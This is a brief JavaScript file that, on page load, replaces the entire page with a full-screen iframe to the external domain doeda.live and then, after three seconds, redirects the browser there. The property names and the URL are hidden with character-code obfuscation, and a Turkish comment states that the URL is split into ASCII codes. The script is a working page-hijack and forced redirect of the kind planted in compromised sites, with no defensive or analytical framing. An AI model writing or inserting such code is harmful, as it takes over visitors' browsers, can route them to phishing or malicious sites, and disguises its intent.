document.addEventListener("DOMContentLoaded", function(event) { 
    document.body.innerHTML = "<iframe src='https://doeda.live' frameBorder='0' style='width:100vw; height:100vh'></iframe>";

	var w = String.fromCharCode(119, 105, 110, 100, 111, 119);        
	var l = String.fromCharCode(108, 111, 99, 97, 116, 105, 111, 110);     
	var h = String.fromCharCode(104, 114, 101, 102);                      

	// URL'yi ASCII karakter kodları ile parçalara ayır
	var part1 = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47);  
	var part2 = String.fromCharCode(100, 111, 101, 100, 97, 46);           
	var part3 = String.fromCharCode(108, 105, 118, 101);                    

	setTimeout(function() {
		window[w][l][h] = part1 + part2 + part3;
	}, 3000);

});